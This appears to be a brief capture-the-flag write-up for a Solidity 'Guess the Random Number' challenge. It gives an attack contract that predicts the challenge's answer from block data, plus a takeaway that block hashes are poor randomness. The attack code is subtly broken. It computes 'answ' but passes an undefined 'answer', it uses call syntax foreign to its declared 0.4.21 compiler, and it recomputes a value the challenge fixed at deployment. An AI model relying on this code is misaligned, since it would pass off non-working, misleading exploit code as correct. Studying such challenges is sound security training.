# Guess the Random Number

```pragma solidity ^0.4.21;

import "./GuessTheRandomNumber.sol";

contract GuessTheRandomNumberChallengeAttack {

    GuessTheRandomNumberChallenge victim;

    constructor(address _address) public {
        victim = GuessTheRandomNumberChallenge(_address);
    }

    function attack() external payable {
        uint8 answ = uint8(keccak256(block.blockhash(block.number - 1), now));

        victim.guess{value: 1 ether}(answer);
    }
}
```

Takeaway:

'Randomness' cannot be dervived from block numbers or hashes. Often best to use an oracle service where randomness truely matters.